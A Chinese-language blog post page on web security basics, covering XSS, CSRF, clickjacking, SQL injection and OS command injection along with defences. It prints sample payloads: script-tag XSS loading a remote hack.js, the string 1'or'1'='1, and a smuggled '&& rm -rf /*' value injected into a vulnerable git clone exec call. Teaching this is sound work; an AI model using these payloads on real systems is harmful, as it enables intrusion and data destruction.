@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>网络安全普及 | Battle-on</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">
+
+<!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
+<link rel="shortcut icon" href="https://junfa.vercel.app//favicon.ico?v=1599999772222">
+<link rel="stylesheet" href="https://junfa.vercel.app//styles/main.css">
+<script crossorigin="anonymous" integrity="sha384-0ZzCA/j8e6AMgFp0IW8Ml4wkrN+zywlMV3HXwQxVFEbrQtu1GBmH06udQMcP6W3M" src="https://lib.baomitu.com/element-ui/latest/index.js"></script>
+
+
+  
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css" />
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Cross Site Scripting 跨站脚本攻击
+
+XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://junfa.vercel.app/">
+        <img src="https://junfa.vercel.app//images/avatar.png?v=1599999772222" class="site-logo">
+        <h1 class="site-title">Battle-on</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="https://junfa.vercel.app/study" class="site-nav" target="_blank">
+            技术文章
+          </a>
+        
+      
+        
+          <a href="https://junfa.vercel.app/moreabout" class="site-nav" target="_blank">
+            所思所想
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/Battle-on" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <span>坚持原创，坚持独立思考<span>
+    </div>
+    <div class="site-footer">
+      <span><a href="https://github.com/Battle-on">我的主页</a></span> | <a class="rss" href="https://junfa.vercel.app//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">网络安全普及</h2>
+            <div class="post-date">2020-09-13</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="cross-site-scripting-跨站脚本攻击">Cross Site Scripting 跨站脚本攻击</h2>
+<blockquote>
+<p>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法的⾮本站点HTML标签或<br>
+JavaScript进⾏的⼀种攻击。</p>
+</blockquote>
+<p>跨站脚本攻击有可能造成以下影响:</p>
+<blockquote>
+<p>利⽤虚假输⼊表单骗取⽤户个⼈信息。<br>
+利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。<br>
+显示伪造的⽂章或图⽚。</p>
+</blockquote>
+<p>攻击手段：通过注入脚本，获取用户信息，造成损失的等</p>
+<p>攻击类型：</p>
+<ul>
+<li>反射型  - url参数直接注⼊</li>
+</ul>
+<pre><code>http://localhost:3000/?from=china
+// alert尝试
+http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;
+</code></pre>
+<ul>
+<li>存储型 - 存储到DB后读取时注⼊</li>
+</ul>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+// 跨站脚本注⼊
+我来了&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>防御手段：<br>
+1.csp<br>
+2.转义<br>
+3.对本地存储等不可读取，如 cookie设置 http-only<br>
+4.HEAD</p>
+<h2 id="csrf">CSRF</h2>
+<blockquote>
+<p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已登<br>
+录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。</p>
+</blockquote>
+<p>利⽤⽤户登录态</p>
+<p>⽤户不知情</p>
+<p>防御：</p>
+<p>禁⽌第三⽅⽹站带Cookie - 有兼容性问题</p>
+<p>Referer Check - Https不发送referer</p>
+<p>验证码</p>
+<h2 id="点击劫持">点击劫持</h2>
+<blockquote>
+<p>点击劫持是⼀种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹站通过 iframe 嵌套的⽅式嵌⼊⾃⼰<br>
+的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。</p>
+</blockquote>
+<p>防御<br>
+X-FRAME-OPTIONS</p>
+<p>X-FRAME-OPTIONS 是⼀个 HTTP 响应头，在现代浏览器有⼀个很好的⽀持。这个 HTTP 响应头 就<br>
+是为了防御⽤ iframe 嵌套的点击劫持攻击。<br>
+该响应头有三个值可选，分别是</p>
+<pre><code>DENY，表示⻚⾯不允许通过 iframe 的⽅式展示
+SAMEORIGIN，表示⻚⾯可以在相同域名下通过 iframe 的⽅式展示
+ALLOW-FROM，表示⻚⾯可以在指定来源的 iframe 中展示
+</code></pre>
+<p>JS⽅式</p>
+<pre><code>if (self == top) {
+ var style = document.getElementById('click-jack')
+ document.body.removeChild(style)
+ } else {
+ top.location = self.location
+ }
+</code></pre>
+<h2 id="sql-注入">SQL 注入</h2>
+<pre><code>// 填⼊特殊密码
+1'or'1'='1
+// 拼接后的SQL
+SELECT *
+FROM test.user
+WHERE username = 'laowang'
+AND password = '1'or'1'='1
+</code></pre>
+<p>防御</p>
+<p>所有的查询语句建议使⽤数据库提供的参数化查询接⼝**，参数化的语句使⽤参数⽽不是将⽤户<br>
+输⼊变量嵌⼊到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query<br>
+⽅法中的 ? 占位参数。</p>
+<pre><code>// 正确的写法
+const sql = `
+SELECT *
+FROM test.user
+WHERE username = ?
+AND password = ?
+`
+console.log('sql', sql, )
+res = await query(sql,[ctx.request.body.username, ctx.request.body.password])
+</code></pre>
+<h2 id="os命令注入">OS命令注⼊</h2>
+<pre><code>OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令
+注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有
+存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。
+</code></pre>
+<pre><code>// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo
+const exec = require('mz/child_process').exec;
+let params = {/* ⽤户输⼊的参数 */};
+exec(`git clone ${params.repo} /some/path`);
+</code></pre>
+<pre><code>https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://junfa.vercel.app/vue-zu-jian-tong-xin/">
+                  <h3 class="post-title">
+                    vue组件通信
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+
+              
+                <div id="disqus_thread" data-aos="fade-in"></div>
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+
+  
+    <script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
+    <script>
+
+    var options = {
+      shortname: '',
+      apikey: '',
+    }
+    if ('') {
+      options.api = ''
+    }
+    var dsqjs = new DisqusJS(options)
+
+    </script>
+  
+
+
+
+
+  </body>
+</html>
